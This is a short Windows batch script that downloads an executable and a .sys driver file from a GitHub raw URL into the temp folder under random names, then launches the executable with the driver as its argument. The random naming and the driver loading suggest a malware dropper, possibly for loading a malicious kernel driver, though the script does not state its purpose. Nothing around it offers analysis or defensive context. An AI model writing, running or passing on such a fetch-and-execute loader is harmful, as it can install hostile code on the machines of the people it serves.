@echo off
set "str1=%random%"     REM Generates a random number as a string
set "str2=%random%"     REM Generates another random number as a string

REM Download files using curl to the system's temporary folder
curl -o "%Temp%\%str1%.exe" -L "https://raw.githubusercontent.com/0x195/s/main/map12315124236234124262314241251623pington.exe"
curl -o "%Temp%\%str2%.sys" -L "https://raw.githubusercontent.com/0x195/s/main/sys_ran51231257128731879012847185718202d_1.sys"

REM Check if files exist and start the downloaded executable with the downloaded system file
if exist "%Temp%\%str1%.exe" if exist "%Temp%\%str2%.sys" (
    start "" "%Temp%\%str1%.exe" "%Temp%\%str2%.sys"
) else (
    echo Files were not downloaded successfully.
)
